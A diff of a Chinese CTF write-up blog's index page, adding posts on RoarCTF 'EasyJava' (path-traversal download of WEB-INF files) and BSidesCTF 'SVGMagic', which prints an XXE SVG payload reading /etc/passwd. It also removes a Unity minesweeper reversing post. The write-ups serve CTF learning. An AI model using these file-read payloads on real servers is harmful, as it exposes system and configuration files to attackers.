@@ -227,7 +227,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-count">81</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -240,7 +240,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">93</span>
+        <span class="site-state-item-count">95</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -279,6 +279,237 @@
       
 
       
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-EasyJava/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-EasyJava/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-EasyJava</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-09-04 17:09:42" itemprop="dateCreated datePublished" datetime="2020-09-04T17:09:42+08:00">2020-09-04</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-09-21 16:50:11" itemprop="dateModified" datetime="2020-09-21T16:50:11+08:00">2020-09-21</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-EasyJava/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-EasyJava/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>RoarCTF 2019 Easy Java</p>
+<p>题目名称已经告诉了要用Java。上来让我们登录，然后下面有个Help很显眼。注意到URL是Download?filename=help.docx，大概率LFI。打开后提示java.io.FileNotFoundException，但是离谱的是，POST一个filename就可以了。(ﾟ∀。)</p>
+<p>问题是读什么文件。参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/78165051">这个</a>，我们读一下WEB-INF的web.xml，果然发现东西。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Index<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Flag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>有个FlagController在那里，我们接着读WEB-INF/classes/com/wm/ctf/FlagController.class，反编译即可得到flag。(路径要根据包前缀而变化)</p>
+
+    <div id="aplayer-OuwEwcfb" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="789417" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{d9d1cc00-1b71-4b22-bd07-0137edb623a1}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-SVGMagic</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-09-03 17:38:33 / 修改时间：18:31:03" itemprop="dateCreated datePublished" datetime="2020-09-03T17:38:33+08:00">2020-09-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>848</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>BSidesCTF 2019的SVGMagic。开题让我们上传文件，上传其他文件报500，上传SVG会成功渲染，并显示PNG渲染结果。</p>
+<p>SVG实际上是一个XML文档。因此可能出现XXE问题。我们试一下。翻<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element">参考文档</a>SVG标签中能插入元素的有&lt;text&gt;，所以直接写一个进去：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;512px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;190px&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 512 190&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">preserveAspectRatio</span>=<span class="string">&quot;xMidYMid&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">g</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>上传看PNG图片即可得到内容。下一步是拿flag。这题当时环境是让我们拿flag.txt，但是位置不知道。所以盲测。找了一圈，最后猜是在程序根目录下，file:///proc/self/cwd/flag.txt。</p>
+
+    <div id="aplayer-aslarXIS" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="19081573" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{f189ef14-aaaa-429d-88eb-08c721bbedff}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1304,244 +1535,10 @@ $filter = "/union|and|\bor\b|information_schema|updatexml/i";
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/06/02/BUUOJ%E5%88%B7%E9%A2%98-Misc-Mine-Sweeping/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpeg">
-      <meta itemprop="name" content="Tiaonmmn.ZMZ">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tiaonmmn's Littile House">
-    </span>
-
-    
-    
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/06/02/BUUOJ%E5%88%B7%E9%A2%98-Misc-Mine-Sweeping/" class="post-title-link" itemprop="url">BUUOJ刷题-Misc-Mine-Sweeping</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2020-06-02 20:11:36 / 修改时间：22:01:04" itemprop="dateCreated datePublished" datetime="2020-06-02T20:11:36+08:00">2020-06-02</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
-        </span>
-    </span>
-
-  
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/06/02/BUUOJ%E5%88%B7%E9%A2%98-Misc-Mine-Sweeping/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/06/02/BUUOJ%E5%88%B7%E9%A2%98-Misc-Mine-Sweeping/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>3.2k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>De1CTF 2019的Mine Sweeping，你确定这不是道Reverse?</p>
-<p>Unity游戏，直接找Data目录下的Managed的DLL文件，发现一个Assembly-CSharp.dll，应该就是核心代码了。</p>
-<p>拖到dotPeek里，顺利反编译，然后直接Export to project，VS改代码不香么？</p>
-<p>导出来3个文件，Grid.cs里包含GameWin()和GameLose()方法，而Element.cs里的OnMouseUpAsButton()包含有"game over:lose"等关键字符串。</p>
-<p>这道题有很多种解法：</p>
-<h1 id="patch">1 Patch</h1>
-<p>研究OnMouseUpAsButton()方法： <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnMouseUpAsButton</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Grids._instance.bGameEnd || <span class="keyword">this</span>.bIsOpen)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">this</span>.bIsOpen = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> x = (<span class="keyword">int</span>)<span class="keyword">this</span>.transform.position.x;</span><br><span class="line">    <span class="keyword">int</span> y = (<span class="keyword">int</span>)<span class="keyword">this</span>.transform.position.y;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.bIsMine)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.SafeAndThunder(<span class="number">0</span>);</span><br><span class="line">        Grids._instance.bGameEnd = <span class="literal">true</span>;</span><br><span class="line">        Grids._instance.GameLose();</span><br><span class="line">        MonoBehaviour.print((<span class="keyword">object</span>)<span class="string">&quot;game over: lose&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.SafeAndThunder(Grids._instance.CountAdjcentNum(x, y));</span><br><span class="line">        Grids._instance.Flush(x, y, <span class="keyword">new</span> <span class="keyword">bool</span>[<span class="number">29</span>, <span class="number">29</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!Grids._instance.GameWin())</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    Grids._instance.bGameEnd = <span class="literal">true</span>;</span><br><span class="line">    MonoBehaviour.print((<span class="keyword">object</span>)<span class="string">&quot;game over: win&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 很明显的，如果bIsMine为真，执行GameLose()方法。因此我们注释掉三行，变成这样： <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnMouseUpAsButton</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Grids._instance.bGameEnd || <span class="keyword">this</span>.bIsOpen)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">this</span>.bIsOpen = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> x = (<span class="keyword">int</span>)<span class="keyword">this</span>.transform.position.x;</span><br><span class="line">    <span class="keyword">int</span> y = (<span class="keyword">int</span>)<span class="keyword">this</span>.transform.position.y;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.bIsMine)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.SafeAndThunder(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//Grids._instance.bGameEnd = true;</span></span><br><span class="line">        <span class="comment">//Grids._instance.GameLose();</span></span><br><span class="line">        <span class="comment">//MonoBehaviour.print((object)&quot;game over: lose&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.SafeAndThunder(Grids._instance.CountAdjcentNum(x, y));</span><br><span class="line">        Grids._instance.Flush(x, y, <span class="keyword">new</span> <span class="keyword">bool</span>[<span class="number">29</span>, <span class="number">29</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!Grids._instance.GameWin())</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    Grids._instance.bGameEnd = <span class="literal">true</span>;</span><br><span class="line">    MonoBehaviour.print((<span class="keyword">object</span>)<span class="string">&quot;game over: win&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 这样就算踩雷也不会Game Over了。然后我们发现翻了整个代码也没有发现ShowImage之类的调用，那么猜一下这个29*29的方块会不会是某种二维码表现形式。</p>
-<p>注意到在判断bIsMine的时候if和else代码块都调用了SafeAndThunder() <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SafeAndThunder</span>(<span class="params"><span class="keyword">int</span> adjcent</span>)</span></span><br><span class="line"><span class="function"></span>  &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.bIsMine)</span><br><span class="line">      <span class="keyword">this</span>.GetComponent&lt;SpriteRenderer&gt;().sprite = <span class="keyword">this</span>.Thor;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">this</span>.GetComponent&lt;SpriteRenderer&gt;().sprite = <span class="keyword">this</span>.Athene[adjcent];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure> 不是很熟Unity，目测是某种模型？我们尝试把if和else调换后编译替换Assembly-CSharp.dll文件，发现数字和雷的图标对调了，证实了我们的猜测。 然后就发现了下面的DawnsLight() <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.bIsMine)</span><br><span class="line">    <span class="keyword">this</span>.GetComponent&lt;SpriteRenderer&gt;().sprite = <span class="keyword">this</span>.Hodur;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">this</span>.GetComponent&lt;SpriteRenderer&gt;().sprite = <span class="keyword">this</span>.Baldr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 同样的测试一下，发现Baldr对应白色，Hodur对应黑色。很明显了，二维码。 下面我们要让它显示出来。DawnsLight()函数有一次调用，在Grids.cs里的GameWin() <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">GameWin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Elements[,] eleGrids1 = <span class="keyword">this</span>.eleGrids;</span><br><span class="line">  <span class="keyword">int</span> upperBound1 = eleGrids1.GetUpperBound(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">int</span> upperBound2 = eleGrids1.GetUpperBound(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> lowerBound1 = eleGrids1.GetLowerBound(<span class="number">0</span>); lowerBound1 &lt;= upperBound1; ++lowerBound1)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> lowerBound2 = eleGrids1.GetLowerBound(<span class="number">1</span>); lowerBound2 &lt;= upperBound2; ++lowerBound2)</span><br><span class="line">    &#123;</span><br><span class="line">      Elements elements = eleGrids1[lowerBound1, lowerBound2];</span><br><span class="line">      <span class="keyword">if</span> (!elements.bIsOpen &amp;&amp; 